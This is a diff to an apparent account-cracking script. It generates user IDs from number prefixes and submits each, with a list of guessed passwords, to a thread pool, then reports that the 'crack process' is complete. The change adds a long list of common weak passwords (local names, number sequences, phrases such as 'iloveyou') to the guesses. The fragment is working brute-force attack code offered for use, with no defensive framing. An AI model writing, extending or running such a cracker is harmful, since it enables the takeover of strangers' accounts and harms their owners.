@@ -148,7 +148,7 @@ def fuck():
         print('==================================================')
         for love in user:
             uid = code+name+cod+love
-            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','i love you','iloveyou','imissyou','i miss you','free fire','freefire','102030','203040','304050','405060','506070','607080','708090','8090100','135790','jannat','nusrat','sadia1','sadiya','fuck you','fuckyou','sumaiya','fariya']
             yaari.submit(mumit2,uid,pwx,tl)
     print('==================================================')
     print(' [+] Crack process has been completed')
